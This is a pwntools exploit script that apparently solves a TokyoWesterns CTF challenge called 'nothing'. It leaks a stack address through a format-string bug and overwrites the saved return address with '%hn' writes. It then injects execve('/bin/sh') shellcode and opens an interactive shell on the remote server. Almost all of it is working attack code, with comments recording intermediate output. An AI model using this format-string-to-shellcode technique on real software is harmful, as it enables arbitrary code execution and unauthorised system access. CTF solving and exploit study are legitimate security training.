from pwn import *

context.arch = 'amd64'
context.terminal = ["guake", "--split-vertical", "-e"]

# r = remote("0.0.0.0", 9998)
r = remote('pwn02.chal.ctf.westerns.tokyo', 18247)
# r = process('./nothing')

# input()

r.sendline("%lx")
# =>
r.clean(1)
r.sendline("%lx")
# =>

buf_addr = r.clean(1).split(b" ")
# =>
# [b'7fffffffdb90
# >', b'']
buf_addr = int(buf_addr[-2][:-2], 16) + 10
# => 140737488346000

buf_addr_0 = buf_addr & 0xffff
# => 144
buf_addr_1 = (buf_addr & 0xffff0000) >> 16

buf_addr_2 = (buf_addr & 0xffff00000000) >> 32

ret_addr_offset = 254
# => 264

# <s>%jx%k$n = write to string address s value j + len(s) (k is s position in stack)

print(r.clean(1))

s = p64(buf_addr + ret_addr_offset)
# => b'\x98\xdc\xff\xff\xff\x7f\x00\x00'
s = s[:-2]
# => b'\x98\xdc\xff\xff\xff\x7f'
j = buf_addr_0
# => 56208
k = 14
# => 14
payload = f"%{j}x%{k}$hn".ljust(64, ' ')
# => '%56208x%14$hn                                                   '
payload = bytes(payload.encode('ascii')) + s + b'\x00'*8
# => b'%56208x%14$hn                                                   \x98\xdc\xff\xff\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00'

r.send(payload)
# =>

# s = p64(buf_addr + ret_addr_offset + 1)
# s = s[:-2]
# j = buf_addr_1
# k = 14
# payload = f"%{j}x%{k}$hhn".ljust(64, ' ')
# payload = bytes(payload.encode('ascii')) + s + b'\x00'*8

# r.send(payload)

# s = p64(buf_addr + ret_addr_offset + 2)
# s = s[:-2]
# j = 0xff
# # => 255
# k = 14
# payload = f"%{j}x%{k}$hhn".ljust(64, ' ')
# # => '%255x%10$hhn                    '
# payload = bytes(payload.encode('ascii')) + s + b'\x00'*8
# # => b'%255x%10$hhn                    \x98\xdc\xff\xff\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00'

# r.send(payload)
# =>
print(r.clean(1))

s = p64(buf_addr + ret_addr_offset + 2)
# => b'\x9b\xdc\xff\xff\xff\x7f\x00\x00'
s = s[:-2]
# => b'\x9b\xdc\xff\xff\xff\x7f'
j = buf_addr_1
# => 65535
k = 14
# => 14
payload = f"%{j}x%{k}$hn".ljust(64, ' ')
# => '%65535x%14$hn                                                   '
payload = bytes(payload.encode('ascii')) + s + b'\x00'*8
# => b'%65535x%14$hn                                                   \x9b\xdc\xff\xff\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00'

r.send(payload)
# =>

print(r.clean(1))

s = p64(buf_addr + ret_addr_offset + 4)
s = s[:-2]
j = buf_addr_2
k = 14
payload = f"%{j}x%{k}$hn".ljust(64, ' ')
payload = bytes(payload.encode('ascii')) + s + b'\x00'*8

r.send(payload)

shellcode = asm(shellcraft.amd64.linux.sh())

#shellcraft.amd64.linux.sh()
# =>
# "    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
#     /* push b'/bin///sh\\x00' */
#     push 0x68
#     mov rax, 0x732f2f2f6e69622f
#     push rax
#     mov rdi, rsp
#     /* push argument array ['sh\\x00'] */
#     /* push b'sh\\x00' */
#     push 0x1010101 ^ 0x6873
#     xor dword ptr [rsp], 0x1010101
#     xor esi, esi /* 0 */
#     push rsi /* null terminate */
#     push 8
#     pop rsi
#     add rsi, rsp
#     push rsi /* 'sh\\x00' */
#     mov rsi, rsp
#     xor edx, edx /* 0 */
#     /* call execve() */
#     push SYS_execve /* 0x3b */
#     pop rax
#     syscall
# "

pop_shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

r.sendline(b"A"*10 + pop_shell)
print(r.clean(1))

# gdb.attach(r)
r.sendline("q")
r.interactive()
# =>

# r.interactive()
